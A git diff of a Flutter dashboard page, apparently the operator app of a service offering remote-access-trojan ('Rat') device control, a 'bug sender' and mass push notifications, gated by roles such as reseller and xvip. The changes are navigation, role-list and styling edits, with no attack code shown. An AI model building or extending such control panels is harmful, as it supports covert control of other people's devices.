@@ -482,6 +482,18 @@ class _DashboardPageState extends State<DashboardPage>
     });
   }
 
+  void _navigateToRatDashboard() {
+    Navigator.push(
+      context,
+      MaterialPageRoute(
+        builder: (_) => RatDashboardScreen(
+          sessionKey: sessionKey,
+          uId: role,
+        ),
+      ),
+    );
+  }
+
   void _onBottomNavTapped(int index, ThemeProvider theme) {
     if (_bottomNavIndex == index || _isPageLoading) return;
     HapticFeedback.lightImpact();
@@ -503,12 +515,10 @@ class _DashboardPageState extends State<DashboardPage>
         );
         break;
       case 2:
-        newPage = RatDeviceControlScreen(
-         deviceId: device['id'],
-         deviceModel: model,
-         deviceName: name,
-         sessionKey: sessionKey,
-         );
+        newPage = RatDashboardScreen(
+          sessionKey: sessionKey,
+          uId: role,
+        );
         break;
       case 3:
         newPage = InfoPage(sessionKey: sessionKey);
@@ -601,12 +611,12 @@ class _DashboardPageState extends State<DashboardPage>
   Widget _buildQuickActionGrid(ThemeProvider theme) {
     final List<Map<String, dynamic>> actions = [
       {"icon": Icons.wifi_tethering_rounded, "label": "NODE SENDER", "subtitle": "management", "color": kDeathRed, "page": BugSenderPage(sessionKey: sessionKey, username: username, role: role, onBack: () => _changePage(_buildDashboardHome()))},
-      {"icon": Icons.card_giftcard_rounded, "label": "KOMENTAR", "subtitle": "kirim komentar", "color": kDeathRedLight, "page": UcapanPage(sessionKey: sessionKey, username: username, role: role, onBack: () => _changePage(_buildDashboardHome()))},
+      {"icon": Icons.card_giftcard_rounded, "label": "KOMENTAR", "subtitle": "kirim komentar", "color": kDeathRed, "page": UcapanPage(sessionKey: sessionKey, username: username, role: role, onBack: () => _changePage(_buildDashboardHome()))},
       {"icon": Icons.public_rounded, "label": "PUBLIC CHAT", "subtitle": "diskusi", "color": kDeathRed, "page": GlobalChatPage(sessionKey: sessionKey, username: username, role: role)},
-      {"icon": Icons.wb_sunny_rounded, "label": "CUACA", "subtitle": "info terkini", "color": kDeathGoldDark, "page": WeatherPage(sessionKey: sessionKey, username: username, onBack: () => _changePage(_buildDashboardHome()))},
+      {"icon": Icons.wb_sunny_rounded, "label": "CUACA", "subtitle": "info terkini", "color": kDeathGold, "page": WeatherPage(sessionKey: sessionKey, username: username, onBack: () => _changePage(_buildDashboardHome()))},
     ];
 
-    final List<String> devRoles = ['developer', 'executive'];
+    final List<String> devRoles = ['developer', 'executive', 'xfounder', 'moderator', 'owner'];
     final List<Map<String, dynamic>> finalActions = List.from(actions);
     
     if (devRoles.contains(role.toLowerCase())) {
@@ -615,7 +625,10 @@ class _DashboardPageState extends State<DashboardPage>
         "label": "NOTIF CONTROL",
         "subtitle": "massal",
         "color": kDeathRed,
-        "page": SendPushPage(sessionKey: sessionKey, onBack: () => _changePage(_buildDashboardHome())),
+        "page": SendPushPage(
+          sessionKey: sessionKey,
+          onBack: () => _changePage(_buildDashboardHome()),
+        ),
       });
     }
 
@@ -1482,7 +1495,7 @@ class _DashboardPageState extends State<DashboardPage>
                     theme: theme,
                   ),
                 if (['developer', 'executive', 'xfounder', 'moderator',
-                        'owner', 'owner', 'xvip', 'reseller']
+                        'owner', 'xvip', 'reseller']
                     .contains(role))
                   _buildDrawerItem(
                     icon: Icons.workspace_premium_rounded,
@@ -2110,14 +2123,14 @@ class _DashboardPageState extends State<DashboardPage>
                           ]
                         : null,
                   ),
-                  child: activeIcon is FaIconData
-                      ? FaIcon(
-                          activeIcon,
+                  child: activeIcon is IconData
+                      ? Icon(
+                          isSelected ? activeIcon : inactiveIcon,
                           color: isSelected ? kDeathRed : Colors.white.withOpacity(0.18),
                           size: isSelected ? 24 : 18,
                         )
-                      : Icon(
-                          isSelected ? activeIcon : inactiveIcon,
+                      : FaIcon(
+                          activeIcon,
                           color: isSelected ? kDeathRed : Colors.white.withOpacity(0.18),
                           size: isSelected ? 24 : 18,
                         ),
